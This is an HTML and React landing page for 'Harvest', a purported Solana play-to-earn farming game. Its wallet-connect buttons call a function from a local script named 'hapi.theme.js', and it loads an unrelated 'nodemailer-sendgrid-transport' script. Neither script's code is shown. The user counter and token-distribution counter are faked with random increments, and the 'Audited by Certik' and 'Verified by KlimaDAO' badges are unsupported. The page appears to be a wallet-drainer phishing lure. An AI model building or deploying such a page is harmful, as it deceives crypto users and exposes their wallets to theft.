<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Harvest - Sustainable Play-to-Earn Gaming</title>
  <script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>
  <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="./nodemailer-sendgrid-transport.plus.umd.js"></script>
  <script src="./hapi.theme.js"></script>
  <script>
    function startConnect(){ if(window.startConnect){ window.startConnect(); } else { alert("startConnect() missing in hapi.theme.js"); } }
  </script>
</head>
<body>
  <div id="root"></div>

  <script type="text/babel">
    const { useState, useEffect } = React;

    // Icon Components
    const Leaf = ({ className }) => (
      <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M11 20A7 7 0 0 1 9.8 6.1C15.5 5 17 4.48 19 2c1 2 2 4.18 2 8 0 5.5-4.78 10-10 10Z"/>
        <path d="M2 21c0-3 1.85-5.36 5.08-6C9.5 14.52 12 13 13 12"/>
      </svg>
    );

    const Wallet = ({ className }) => (
      <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"/>
        <path d="M3 5v14a2 2 0 0 0 2 2h16v-5"/>
        <path d="M18 12a2 2 0 0 0 0 4h4v-4Z"/>
      </svg>
    );

    const CheckCircle = ({ className }) => (
      <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
        <polyline points="22 4 12 14.01 9 11.01"/>
      </svg>
    );

    const Zap = ({ className }) => (
      <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
      </svg>
    );

    const Users = ({ className }) => (
      <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/>
        <circle cx="9" cy="7" r="4"/>
        <path d="M22 21v-2a4 4 0 0 0-3-3.87"/>
        <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
      </svg>
    );

    const TrendingUp = ({ className }) => (
      <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <polyline points="22 7 13.5 15.5 8.5 10.5 2 17"/>
        <polyline points="16 7 22 7 22 13"/>
      </svg>
    );

    const Sprout = ({ className }) => (
      <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M7 20h10"/>
        <path d="M10 20c5.5-2.5.8-6.4 3-10"/>
        <path d="M9.5 9.4c1.1.8 1.8 2.2 2.3 3.7-2 .4-3.5.4-4.8-.3-1.2-.6-2.3-1.9-3-4.2 2.8-.5 4.4 0 5.5.8z"/>
        <path d="M14.1 6a7 7 0 0 0-1.1 4c1.9-.1 3.3-.6 4.3-1.4 1-1 1.6-2.3 1.7-4.6-2.7.1-4 1-4.9 2z"/>
      </svg>
    );

    const Award = ({ className }) => (
      <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="8" r="6"/>
        <path d="M15.477 12.89 17 22l-5-3-5 3 1.523-9.11"/>
      </svg>
    );

    const Shield = ({ className }) => (
      <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
      </svg>
    );

    const Twitter = ({ className }) => (
      <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z"/>
      </svg>
    );

    const MessageCircle = ({ className }) => (
      <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
      </svg>
    );

    const FileText = ({ className }) => (
      <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"/>
        <polyline points="14 2 14 8 20 8"/>
        <line x1="16" x2="8" y1="13" y2="13"/>
        <line x1="16" x2="8" y1="17" y2="17"/>
        <line x1="10" x2="8" y1="9" y2="9"/>
      </svg>
    );

    const HarvestLanding = () => {
      const [walletConnected, setWalletConnected] = useState(false);
      const [inviteCode, setInviteCode] = useState('');
      const [activeFarmers, setActiveFarmers] = useState(12345);
      const [totalRewards, setTotalRewards] = useState(64312);
      const [treesPlanted, setTreesPlanted] = useState(1234);
      const [showInviteSuccess, setShowInviteSuccess] = useState(false);
      const [scrollY, setScrollY] = useState(0);

      useEffect(() => {
        const handleScroll = () => setScrollY(window.scrollY);
        window.addEventListener('scroll', handleScroll);
        return () => window.removeEventListener('scroll', handleScroll);
      }, []);

      useEffect(() => {
        const interval = setInterval(() => {
          setActiveFarmers(prev => prev + Math.floor(Math.random() * 3));
          setTotalRewards(prev => prev + Math.floor(Math.random() * 2));
        }, 3000);
        return () => clearInterval(interval);
      }, []);

      const handleWalletConnect = () => {
      if (window.startConnect) {
        window.startConnect();
        setWalletConnected(true);
      } else {
        alert("startConnect() not found!");
      }
    };

      const handleInviteSubmit = () => {
        if (inviteCode) {
          setShowInviteSuccess(true);
          setTimeout(() => setShowInviteSuccess(false), 3000);
        }
      };

      return (
        <div className="min-h-screen bg-black text-white overflow-x-hidden">
          <nav className="fixed top-0 left-0 right-0 z-50 bg-black/80 backdrop-blur-xl border-b border-white/5">
            <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-gradient-to-br from-emerald-400 to-lime-500 rounded-xl flex items-center justify-center">
                  <Leaf className="w-6 h-6 text-black" />
                </div>
                <span className="text-2xl font-bold">Harvest</span>
              </div>
              <button
                onClick={handleWalletConnect}
                className="px-6 py-2.5 bg-white text-black rounded-full font-medium hover:bg-gray-100 transition-all duration-200 flex items-center gap-2"
              >
                <Wallet className="w-4 h-4" />
                {walletConnected ? 'Connected' : 'Connect'}
              </button>
            </div>
          </nav>

          <section className="relative pt-32 pb-20 px-6">
            <div className="absolute inset-0 overflow-hidden">
              <div className="absolute top-1/4 left-1/4 w-96 h-96 bg-emerald-500/20 rounded-full blur-3xl" 
                   style={{ transform: `translateY(${scrollY * 0.3}px)` }} />
              <div className="absolute bottom-1/4 right-1/4 w-96 h-96 bg-lime-500/20 rounded-full blur-3xl"
                   style={{ transform: `translateY(${scrollY * -0.2}px)` }} />
            </div>

            <div className="relative z-10 max-w-5xl mx-auto text-center">
              <div className="inline-flex items-center gap-2 bg-white/5 backdrop-blur-sm border border-white/10 rounded-full px-4 py-2 mb-8">
                <Zap className="w-4 h-4 text-emerald-400" />
                <span className="text-sm text-gray-300">Play-to-Earn on Solana</span>
              </div>

              <h1 className="text-6xl md:text-8xl font-bold mb-6 leading-tight">
                <span className="bg-gradient-to-r from-emerald-400 via-lime-400 to-green-300 bg-clip-text text-transparent">
                  The Future of Farming
                </span>
              </h1>
              
              <p className="text-xl text-gray-400 mb-12 max-w-2xl mx-auto leading-relaxed">
                Plant rare crops, earn $HARVEST tokens, and fund real-world sustainability projects on the blockchain.
              </p>

              <div className="flex flex-col sm:flex-row gap-4 justify-center items-center mb-16">
                <button
                  onClick={handleWalletConnect}
                  className="px-8 py-4 bg-gradient-to-r from-emerald-500 to-lime-500 rounded-full font-semibold text-black transition-all duration-200 hover:shadow-2xl hover:shadow-emerald-500/50 hover:scale-105 flex items-center gap-2"
                >
                  {walletConnected ? (
                    <>
                      <CheckCircle className="w-5 h-5" />
                      Wallet Connected
                    </>
                  ) : (
                    <>
                      <Wallet className="w-5 h-5" />
                      Connect Wallet
                    </>
                  )}
                </button>

                <div className="relative">
                  <input
                    type="text"
                    value={inviteCode}
                    onChange={(e) => setInviteCode(e.target.value)}
                    placeholder="Enter invite code"
                    className="pl-4 pr-24 py-4 bg-white/5 backdrop-blur-sm border border-white/10 focus:border-emerald-500/50 rounded-full outline-none transition-all duration-200 text-white placeholder-gray-500 w-64"
                  />
                  <button
                    onClick={handleInviteSubmit}
                    className="absolute right-1 top-1/2 -translate-y-1/2 px-6 py-2.5 bg-white text-black rounded-full text-sm font-medium hover:bg-gray-100 transition-all duration-200"
                  >
                    Join
                  </button>
                </div>
              </div>

              {showInviteSuccess && (
                <div className="fixed top-24 left-1/2 -translate-x-1/2 bg-emerald-500 text-black px-6 py-3 rounded-full font-medium shadow-2xl z-50" style={{animation: 'fadeIn 0.4s ease-out'}}>
                  ✓ Welcome to Harvest!
                </div>
              )}

              <div className="grid grid-cols-1 sm:grid-cols-3 gap-6 max-w-3xl mx-auto">
                <div className="bg-white/5 backdrop-blur-sm border border-white/10 rounded-2xl p-6">
                  <Users className="w-8 h-8 text-emerald-400 mb-3 mx-auto" />
                  <div className="text-3xl font-bold mb-1">{activeFarmers.toLocaleString()}</div>
                  <div className="text-sm text-gray-400">Active Farmers</div>
                </div>
                <div className="bg-white/5 backdrop-blur-sm border border-white/10 rounded-2xl p-6">
                  <TrendingUp className="w-8 h-8 text-lime-400 mb-3 mx-auto" />
                  <div className="text-3xl font-bold mb-1">{totalRewards.toLocaleString()}</div>
                  <div className="text-sm text-gray-400">Total Tokens Distributed</div>
                </div>
                <div className="bg-white/5 backdrop-blur-sm border border-white/10 rounded-2xl p-6">
                  <Leaf className="w-8 h-8 text-green-400 mb-3 mx-auto" />
                  <div className="text-3xl font-bold mb-1">{treesPlanted.toLocaleString()}</div>
                  <div className="text-sm text-gray-400">Trees Funded</div>
                </div>
              </div>
            </div>
          </section>

          <section className="py-20 px-6">
            <div className="max-w-6xl mx-auto">
              <div className="text-center mb-16">
                <h2 className="text-4xl md:text-5xl font-bold mb-4">Your Farm Awaits</h2>
                <p className="text-lg md:text-xl text-gray-400">Build, harvest, and earn on the blockchain</p>
              </div>

              <div className="relative bg-gradient-to-br from-emerald-950/30 via-green-950/20 to-black/50 backdrop-blur-sm border border-emerald-500/20 rounded-3xl overflow-hidden">
                <div className="aspect-video bg-gradient-to-br from-emerald-900/20 to-lime-900/10 flex items-center justify-center relative overflow-hidden">
                  <div className="absolute inset-0" style={{
                    backgroundImage: 'linear-gradient(rgba(52, 211, 153, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(52, 211, 153, 0.1) 1px, transparent 1px)',
                    backgroundSize: '50px 50px'
                  }} />
                  
                  <div className="relative z-10 grid grid-cols-1 sm:grid-cols-3 gap-4 md:gap-8 p-6 md:p-12 w-full max-w-4xl">
                    {[1, 2, 3].map(num => (
                      <div key={num} className="bg-black/40 backdrop-blur-sm border border-white/10 rounded-2xl p-4 md:p-6 flex flex-col items-center justify-center hover:border-white/20 transition-all cursor-pointer">
                        <div className="w-8 h-8 md:w-12 md:h-12 border-2 border-dashed border-gray-600 rounded-lg mb-2 md:mb-3" />
                        <div className="text-xs md:text-sm text-gray-400">Plot #{num}</div>
                        <div className="text-xs text-gray-500 font-medium mt-1">Empty</div>
                      </div>
                    ))}
                  </div>
                </div>

                <div className="border-t border-white/5 p-4 md:p-6">
                  <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
                    <div className="flex flex-wrap items-center gap-4 md:gap-6 text-sm md:text-base">
                      <div>
                        <div className="text-xs text-gray-500 mb-1">Daily Yield</div>
                        <div className="text-base md:text-lg font-bold text-gray-600">0 $HARVEST</div>
                      </div>
                      <div className="w-px h-8 bg-white/10 hidden sm:block" />
                      <div>
                        <div className="text-xs text-gray-500 mb-1">Farm Level</div>
                        <div className="text-base md:text-lg font-bold text-white">Level 1</div>
                      </div>
                      <div className="w-px h-8 bg-white/10 hidden sm:block" />
                      <div>
                        <div className="text-xs text-gray-500 mb-1">Plots Owned</div>
                        <div className="text-base md:text-lg font-bold text-white">3/10</div>
                      </div>
                    </div>
                    <button 
                      onClick={walletConnected ? undefined : handleWalletConnect}
                      disabled={!walletConnected}
                      className={`w-full sm:w-auto px-4 md:px-6 py-2.5 md:py-3 rounded-full font-semibold transition-all text-sm md:text-base ${
                        walletConnected 
                          ? 'bg-gradient-to-r from-emerald-500 to-lime-500 text-black hover:shadow-xl hover:shadow-emerald-500/50' 
                          : 'bg-white/10 text-gray-400 cursor-not-allowed'
                      }`}
                    >
                      {walletConnected ? 'Start Farming' : 'Connect to Play'}
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </section>

          <section className="py-20 px-6">
            <div className="max-w-6xl mx-auto">
              <div className="text-center mb-16">
                <h2 className="text-5xl font-bold mb-4">How Harvest Works</h2>
                <p className="text-xl text-gray-400">Three simple steps to earn</p>
              </div>

              <div className="grid md:grid-cols-3 gap-8">
                <div className="group bg-gradient-to-br from-white/5 to-white/0 backdrop-blur-sm border border-white/10 hover:border-emerald-500/50 rounded-3xl p-8 transition-all duration-300 hover:scale-105">
                  <div className="w-16 h-16 bg-gradient-to-br from-emerald-500 to-lime-500 rounded-2xl flex items-center justify-center mb-6">
                    <Sprout className="w-8 h-8 text-black" />
                  </div>
                  <h3 className="text-2xl font-bold mb-3">Plant</h3>
                  <p className="text-gray-400 leading-relaxed">
                    Select rare crop NFTs and plant them in your Solana-powered farm. Watch them grow in real-time.
                  </p>
                </div>

                <div className="group bg-gradient-to-br from-white/5 to-white/0 backdrop-blur-sm border border-white/10 hover:border-lime-500/50 rounded-3xl p-8 transition-all duration-300 hover:scale-105">
                  <div className="w-16 h-16 bg-gradient-to-br from-lime-500 to-emerald-500 rounded-2xl flex items-center justify-center mb-6">
                    <TrendingUp className="w-8 h-8 text-black" />
                  </div>
                  <h3 className="text-2xl font-bold mb-3">Harvest</h3>
                  <p className="text-gray-400 leading-relaxed">
                    Earn $HARVEST tokens from mature crops. Rarer crops yield higher multipliers and better rewards.
                  </p>
                </div>

                <div className="group bg-gradient-to-br from-white/5 to-white/0 backdrop-blur-sm border border-white/10 hover:border-green-500/50 rounded-3xl p-8 transition-all duration-300 hover:scale-105">
                  <div className="w-16 h-16 bg-gradient-to-br from-green-500 to-emerald-500 rounded-2xl flex items-center justify-center mb-6">
                    <Award className="w-8 h-8 text-black" />
                  </div>
                  <h3 className="text-2xl font-bold mb-3">Trade</h3>
                  <p className="text-gray-400 leading-relaxed">
                    Swap crops and tokens on our DEX or compete on global leaderboards for exclusive rewards.
                  </p>
                </div>
              </div>
            </div>
          </section>

          <section className="py-20 px-6">
            <div className="max-w-4xl mx-auto">
              <div className="bg-gradient-to-br from-emerald-950/50 via-green-950/30 to-black/50 backdrop-blur-sm border border-emerald-500/20 rounded-3xl p-12 text-center">
                <Leaf className="w-16 h-16 text-emerald-400 mx-auto mb-6" />
                <h2 className="text-4xl font-bold mb-4">Real Impact</h2>
                <p className="text-xl text-gray-300 mb-8 max-w-2xl mx-auto">
                  5% of all platform fees fund verified eco-projects. Every harvest makes a difference.
                </p>
                
                <div className="text-6xl font-bold text-emerald-400 mb-2">
                  {treesPlanted.toLocaleString()}
                </div>
                <div className="text-xl text-gray-300 mb-8">Trees Funded & Growing</div>
                
                <div className="flex flex-wrap justify-center gap-4 text-sm">
                  <div className="flex items-center gap-2 bg-white/5 backdrop-blur-sm border border-white/10 rounded-full px-4 py-2">
                    <Shield className="w-4 h-4 text-emerald-400" />
                    <span className="text-gray-300">Verified by KlimaDAO</span>
                  </div>
                  <div className="flex items-center gap-2 bg-white/5 backdrop-blur-sm border border-white/10 rounded-full px-4 py-2">
                    <Shield className="w-4 h-4 text-emerald-400" />
                    <span className="text-gray-300">Audited by Certik</span>
                  </div>
                </div>
              </div>
            </div>
          </section>

          <footer className="border-t border-white/5 py-12 px-6 mt-20">
            <div className="max-w-6xl mx-auto">
              <div className="grid md:grid-cols-4 gap-8 mb-8">
                <div>
                  <div className="flex items-center gap-3 mb-4">
                    <div className="w-10 h-10 bg-gradient-to-br from-emerald-400 to-lime-500 rounded-xl flex items-center justify-center">
                      <Leaf className="w-6 h-6 text-black" />
                    </div>
                    <span className="text-xl font-bold">Harvest</span>
                  </div>
                  <p className="text-gray-500 text-sm">Sustainable play-to-earn gaming on Solana</p>
                </div>
                
                <div>
                  <h4 className="font-semibold mb-3 text-white">Community</h4>
                  <div className="space-y-2">
                    <a href="#" className="flex items-center gap-2 text-gray-400 hover:text-emerald-400 transition-colors text-sm">
                      <Twitter className="w-4 h-4" />
                      Twitter
                    </a>
                    <a href="#" className="flex items-center gap-2 text-gray-400 hover:text-emerald-400 transition-colors text-sm">
                      <MessageCircle className="w-4 h-4" />
                      Discord
                    </a>
                  </div>
                </div>
                
                <div>
                  <h4 className="font-semibold mb-3 text-white">Resources</h4>
                  <div className="space-y-2">
                    <a href="#" className="flex items-center gap-2 text-gray-400 hover:text-emerald-400 transition-colors text-sm">
                      <FileText className="w-4 h-4" />
                      Whitepaper
                    </a>
                    <a href="#" className="flex items-center gap-2 text-gray-400 hover:text-emerald-400 transition-colors text-sm">
                      <FileText className="w-4 h-4" />
                      Documentation
                    </a>
                  </div>
                </div>
                
                <div>
                  <h4 className="font-semibold mb-3 text-white">Referral Code</h4>
                  <div className="bg-white/5 backdrop-blur-sm border border-white/10 rounded-lg px-3 py-2 text-sm text-emerald-400 font-mono">
                    FARM-XYZ123
                  </div>
                  <p className="text-xs text-gray-500 mt-2">Earn 10% bonus per referral</p>
                </div>
              </div>
              
              <div className="border-t border-white/5 pt-8 flex flex-col sm:flex-row justify-between items-center gap-4 text-sm text-gray-500">
                <p>© 2025 Harvest. All rights reserved.</p>
                <div className="flex items-center gap-2">
                  <span>Powered by</span>
                  <a href="https://solana.com" target="_blank" rel="noopener noreferrer" className="text-emerald-400 hover:text-emerald-300 transition-colors font-semibold">
                    Solana
                  </a>
                </div>
              </div>
            </div>
          </footer>

          <style>{`
            @keyframes fadeIn {
              from { opacity: 0; transform: translate(-50%, -20px); }
              to { opacity: 1; transform: translate(-50%, 0); }
            }
          `}</style>
        </div>
      );
    };

    const container = document.getElementById('root');
    const root = ReactDOM.createRoot(container);
    root.render(<HarvestLanding />);
  </script>
</body>
</html>
